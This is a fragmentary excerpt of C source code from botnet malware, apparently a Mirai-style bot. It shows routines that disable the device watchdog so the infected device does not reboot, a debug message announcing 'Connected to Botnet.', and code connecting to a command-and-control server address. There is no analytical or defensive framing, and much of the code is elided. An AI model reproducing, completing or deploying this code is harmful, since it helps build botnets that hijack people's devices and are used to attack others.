    ...
    int name_buf_len = 0, tbl_exec_succ_len = 0, pgid = 0, pings = 0;
        ...
        if((watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG, NULL), 2)) != -1 ||
           (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG2, NULL), 2)) != -1) {
            #ifdef DEBUG
            printf("[main] found a valid watchdog driver\n");
            #endif
            ioctl(watchdog_fd, 0x80045704, 1);
			watchdog_pid = fork();
			if(watchdog_pid == 0) {
				while(TRUE) {
					#ifdef DEBUG
        ...
        if(pending_connection)
        {
            ...
            else
            {
                ...
                else
                {
                    ...
                    #ifdef DEBUG
                        printf("[main] Connected to Botnet.\n");
                    #endif
                }
            }
        }
...
{
    #ifndef USEDOMAIN
    srv_addr.sin_addr.s_addr = CNCIP;
    srv_addr.sin_port = htons(CNCPORT);
    #else
